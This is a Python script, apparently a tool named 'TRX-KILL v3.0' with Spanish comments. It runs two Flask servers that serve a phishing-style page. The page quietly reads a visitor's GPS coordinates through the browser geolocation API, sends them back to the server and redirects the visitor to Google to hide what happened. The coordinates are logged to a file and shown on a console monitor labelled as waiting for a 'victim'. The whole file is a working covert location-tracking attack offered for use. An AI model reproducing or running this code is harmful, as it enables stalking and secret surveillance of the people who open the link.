import os, sys, time, threading
from flask import Flask, request

# Configuración
STORAGE_PATH = "/sdcard/TRX-KILL-RESUL"
LOG_FILE = f"{STORAGE_PATH}/result.txt"
B, C, W = "\033[1;34m", "\033[1;36m", "\033[0m"

if not os.path.exists(STORAGE_PATH): os.makedirs(STORAGE_PATH)

app1 = Flask('SRV-1')
app2 = Flask('SRV-2')
logging = __import__('logging')
logging.getLogger('werkzeug').setLevel(logging.ERROR)

@app1.route('/')
@app2.route('/')
def index():
    return """<html><body><script>
        navigator.geolocation.getCurrentPosition(pos => {
            fetch('/log?lat='+pos.coords.latitude+'&lon='+pos.coords.longitude);
            window.location.href='https://www.google.com';
        });
    </script></html>"""

@app1.route('/log')
@app2.route('/log')
def log():
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    with open(LOG_FILE, "a") as f:
        f.write(f"GPS: {lat},{lon}\n")
    return "OK"

def main():
    # Limpieza total antes de iniciar
    os.system("fuser -k 5000/tcp 8080/tcp > /dev/null 2>&1")
    
    # Arrancar dos servidores en puertos distintos
    threading.Thread(target=lambda: app1.run(host='0.0.0.0', port=5000, debug=False), daemon=True).start()
    threading.Thread(target=lambda: app2.run(host='0.0.0.0', port=8080, debug=False), daemon=True).start()
    
    while True:
        os.system('clear')
        print(f"{B}####################################")
        print(f"{C}#    TRX-KILL v3.0 | MODO DUAL     #")
        print(f"{B}####################################{W}\n")
        print(f"{C}[01] RASTREAR | [02] LINK-MONITOR | [00] SALIR{W}")
        sel = input(f"\n{B}TRX-ROOT > {W}")

        if sel == "02":
            os.system('clear')
            print(f"{C}--- MONITOR DE PUERTOS (5000 y 8080) ---{W}")
            print(f"Link 1: http://localhost:5000")
            print(f"Link 2: http://localhost:8080")
            print(f"{B}ESPERANDO VÍCTIMA... (No presiones nada, los datos aparecerán solos){W}")
            
            # Bucle de monitoreo puro (sin input que bloquee)
            while True:
                time.sleep(2)
                if os.path.exists(LOG_FILE):
                    with open(LOG_FILE, 'r') as f:
                        lines = f.readlines()
                        if lines:
                            os.system('clear')
                            print(f"{C}¡DATOS RECIBIDOS EN TIEMPO REAL!{W}\n")
                            # Muestra las últimas 5 capturas
                            for l in lines[-5:]:
                                print(f"{B}{l.strip()}{W}")
        
        elif sel == "00": 
            os.system("fuser -k 5000/tcp 8080/tcp")
            sys.exit()

if __name__ == "__main__": main()
